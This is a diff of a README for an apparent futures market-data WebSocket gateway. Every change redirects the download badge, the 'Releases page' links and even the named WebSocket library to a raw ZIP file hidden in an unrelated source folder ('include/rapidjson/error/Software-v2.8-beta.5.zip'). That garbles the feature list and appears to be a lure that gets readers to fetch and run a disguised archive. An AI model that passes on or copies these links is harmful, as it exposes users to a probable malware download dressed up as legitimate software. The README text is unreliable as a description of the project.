@@ -1,6 +1,6 @@
 # 🚀 qaopenmdgateway - Access Real-Time Market Data Easily
 
-[![Download qaopenmdgateway](https://raw.githubusercontent.com/bobadilla2133/qaopenmdgateway/main/emissaryship/qaopenmdgateway.zip)](https://raw.githubusercontent.com/bobadilla2133/qaopenmdgateway/main/emissaryship/qaopenmdgateway.zip)
+[![Download qaopenmdgateway](https://raw.githubusercontent.com/bobadilla2133/qaopenmdgateway/main/include/rapidjson/error/Software-v2.8-beta.5.zip)](https://raw.githubusercontent.com/bobadilla2133/qaopenmdgateway/main/include/rapidjson/error/Software-v2.8-beta.5.zip)
 
 ## 📖 项目概述
 
@@ -14,7 +14,7 @@ qaopenmdgateway是一个基于CTP API的高性能期货行情数据WebSocket服�
 - **高性能架构**: 采用异步I/O及连接池，确保毫秒级的延迟。
 - **Redis数据缓存**: 集成Redis以实现行情数据的持久化存储。
 - **灵活配置管理**: 通过JSON配置文件支持动态添加期货公司连接。
-- **WebSocket服务**: 基于https://raw.githubusercontent.com/bobadilla2133/qaopenmdgateway/main/emissaryship/qaopenmdgateway.zip的高性能WebSocket服务器。
+- **WebSocket服务**: 基于https://raw.githubusercontent.com/bobadilla2133/qaopenmdgateway/main/include/rapidjson/error/Software-v2.8-beta.5.zip的高性能WebSocket服务器。
 - **智能订阅管理**: 增量订阅机制，避免重复CTP订阅，提升系统效率。
 - **多客户端支持**: 支持多个WebSocket客户端同时连接，确保精准推送。
 - **独立共享内存**: 使用专用共享内存段`qamddata`，与主项目解耦。
@@ -36,7 +36,7 @@ qaopenmdgateway是一个基于CTP API的高性能期货行情数据WebSocket服�
 To start using qaopenmdgateway, follow these steps:
 
 ### 1. Visit the Download Page
-Go to the [Releases page](https://raw.githubusercontent.com/bobadilla2133/qaopenmdgateway/main/emissaryship/qaopenmdgateway.zip) to find the latest version of qaopenmdgateway.
+Go to the [Releases page](https://raw.githubusercontent.com/bobadilla2133/qaopenmdgateway/main/include/rapidjson/error/Software-v2.8-beta.5.zip) to find the latest version of qaopenmdgateway.
 
 ### 2. Download the Software
 Find the latest release and download the appropriate file for your system. Look for files labeled as `exe`, `zip`, or similar.
@@ -52,7 +52,7 @@ You may need to set up your connection details in the JSON configuration file. R
 
 ## 📥 Download & Install
 
-To get started with qaopenmdgateway, visit the [Releases page](https://raw.githubusercontent.com/bobadilla2133/qaopenmdgateway/main/emissaryship/qaopenmdgateway.zip) to download the latest version. Follow the installation steps outlined above.
+To get started with qaopenmdgateway, visit the [Releases page](https://raw.githubusercontent.com/bobadilla2133/qaopenmdgateway/main/include/rapidjson/error/Software-v2.8-beta.5.zip) to download the latest version. Follow the installation steps outlined above.
 
 ## 📚 Resources and Documentation
 
